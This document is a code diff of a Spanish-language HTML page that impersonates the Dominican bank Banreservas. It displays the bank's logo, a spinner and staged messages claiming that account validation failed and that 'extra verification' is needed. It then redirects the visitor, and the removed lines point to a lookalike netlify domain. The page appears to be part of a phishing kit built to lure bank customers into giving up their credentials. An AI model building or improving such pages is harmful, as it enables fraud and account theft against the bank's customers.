@@ -5,34 +5,50 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>Validación de datos</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
         body {
-            font-family: 'Open Sans', sans-serif;
-            background-color: #f0f4f8;
+            font-family: 'Roboto', sans-serif;
+            background-color: #ffffff; /* Fondo blanco */
             margin: 0;
             padding: 0;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            flex-direction: column;
+            color: #004D61;
+            overflow: hidden;
         }
 
         .logo {
-            margin-bottom: 30px;
+            margin-bottom: 40px;
         }
 
-        .logo img {
-            width: 200px;
+        /* Logo estilo real */
+        .exeter {
+            display: block;
+            width: 250px;
+            height: 70px;
+            background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            touch-action: manipulation;
+            user-select: none;
+            -webkit-user-drag: none;
+            -webkit-tap-highlight-color: rgba(0,0,0,0);
         }
 
         .spinner {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #0072c6;
+            border: 12px solid rgba(0,0,0,0.1);
+            border-top: 12px solid #004D61;
             border-radius: 50%;
-            width: 80px;
-            height: 80px;
+            width: 120px;
+            height: 120px;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 0 15px rgba(0,77,97,0.3);
         }
 
         @keyframes spin {
@@ -42,23 +58,23 @@
 
         .message {
             text-align: center;
-            font-size: 18px;
-            color: #333;
-            max-width: 300px;
-            min-height: 50px;
+            font-size: 22px;
+            max-width: 450px;
+            min-height: 60px;
+            opacity: 0;
+            animation: fadein 1s forwards;
         }
+
+        @keyframes fadein {
+            to { opacity: 1; }
+        }
+
     </style>
-<style type="text/css">
-.grande { font-size: 60px; }
-</style>
-<script>
-// Escribir aqui el código Javascript
-</script>
 </head>
 <body>
 
     <div class="logo">
-        <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" alt="Banreservas Logo">
+        <a title="Banreservas" aria-label="Logo Banreservas" class="exeter"></a>
     </div>
 
     <div class="spinner"></div>
@@ -71,37 +87,37 @@
             "Validando información...",
             "Comprobando historial...",
             "Procesando...",
-            "Verificación fallida...",
+            "Verificación fallida..."
         ];
 
         const finalMessage = "Necesitamos comprobación extra para validar tu cuenta.";
-
         const messageEl = document.getElementById("message");
         let index = 0;
 
-        // Cambia mensajes cada 2 segundos
-        const interval = setInterval(() => {
-            if(index < messages.length) {
+        function showNextMessage() {
+            if (index < messages.length) {
                 messageEl.textContent = messages[index];
                 index++;
+                messageEl.style.opacity = 0;
+                messageEl.offsetHeight; // fuerza reflow
+                messageEl.style.animation = "fadein 1s forwards";
+            } else {
+                messageEl.textContent = finalMessage;
+                messageEl.style.opacity = 0;
+                messageEl.offsetHeight;
+                messageEl.style.animation = "fadein 1s forwards";
             }
-        }, 2000);
+        }
 
-        // Después de 12 segundos (mensajes + buffer), mostrar mensaje final
+        const interval = setInterval(showNextMessage, 2000);
+        showNextMessage();
+
+        // Después de todos los mensajes, redirige
         setTimeout(() => {
             clearInterval(interval);
-            messageEl.textContent = finalMessage;
-        }, 12000);
-
-        // Redirige 3 segundos después de mostrar el mensaje final
-        setTimeout(() => {
-            window.location.href = "https://reservas-validar.netlify.app/";
+            window.location.href = "#";
         }, 15000);
     </script>
 
-
-
-
-
-</body></html>
-
+</body>
+</html>
